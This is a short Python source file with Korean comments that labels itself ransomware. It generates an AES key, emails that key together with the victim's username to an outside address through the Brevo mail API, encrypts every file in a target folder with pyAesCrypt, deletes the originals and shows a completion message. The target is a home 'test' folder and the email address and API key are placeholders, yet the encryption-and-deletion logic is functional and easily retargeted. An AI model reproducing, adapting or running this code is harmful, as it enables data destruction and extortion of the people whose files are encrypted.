# Warning 이 파일은 RANSOMEWARE 암호화 파일입니다.
import os
import shutil  # 파일 이동을 위한 모듈
import pyAesCrypt  # AES 암호화를 위한 모듈
import secrets  # 보안 키 생성
import tkinter as tk  # GUI를 위한 모듈
from tkinter import messagebox
from pathlib import Path  # 파일 경로를 다루기 위한 모듈
import requests  # HTTP 요청을 위한 모듈

# 암호화할 파일이 들어 있는 폴더 경로 설정
folders_path = [
    str(os.path.join(Path.home(), "test")), 
]

# 16바이트 길이의 암호화 키 생성
key = secrets.token_hex(16)

# Brevo API를 사용하여 생성된 암호화 키를 이메일로 보내기 위한 URL
url = "https://api.brevo.com/v3/smtp/email"

# 이메일 요청에 사용될 데이터 페이로드
payload = {
    "sender": {"email": "Email address"},  # 발신인 이메일 주소
    "to": [{"email": "Email address"}],  # 수신인 이메일 주소
    "subject": "Decryption Key for " + str(os.getlogin()),  # 이메일 제목
    "htmlContent": f"<p>Your decryption key is: {key}</p>",  # HTML 형식의 이메일 본문
    "textContent": f"Your decryption key is: {key}"  # 텍스트 형식의 이메일 본문
}

# API 요청 헤더 설정 (Brevo API 키를 여기에 넣으세요)
headers = {
    "accept": "application/json",
    "api-key": "API-KEY",  # Brevo에서 발급받은 API 키 입력
    "content-type": "application/json"
}

# 이메일을 전송하기 위한 POST 요청
response = requests.post(url, json=payload, headers=headers)

# 요청 결과 출력 (응답 텍스트)
print(response.text)

# 지정된 폴더 내의 모든 파일을 암호화
for folder_path in folders_path:
    for file in os.listdir(folder_path):  # 각 폴더 안의 파일 리스트 탐색
        bufferSize = 64*1024  # AES 암호화 버퍼 사이즈 설정
        file_path = os.path.join(folder_path, file)  # 현재 파일의 전체 경로
        if not file.endswith(".aes"):  # 이미 암호화된 파일은 건너뜀
            # 파일 암호화 수행
            pyAesCrypt.encryptFile(file_path, file_path + ".aes", key, bufferSize)
            # 암호화된 파일을 새로운 위치로 이동
            destination_path = os.path.join(folder_path, "encrypted_" + file + ".aes")
            shutil.move(file_path + ".aes", destination_path)
            # 원본 파일 삭제
            os.remove(file_path)

# tkinter를 사용하여 암호화가 완료되었음을 사용자에게 알림
root = tk.Tk()
root.withdraw()  # 창을 숨김
messagebox.showinfo("Encryption Complete", "All files in the folders have been encrypted.")  # 메시지 박스 표시
root.mainloop()  # GUI 이벤트 루프 시작
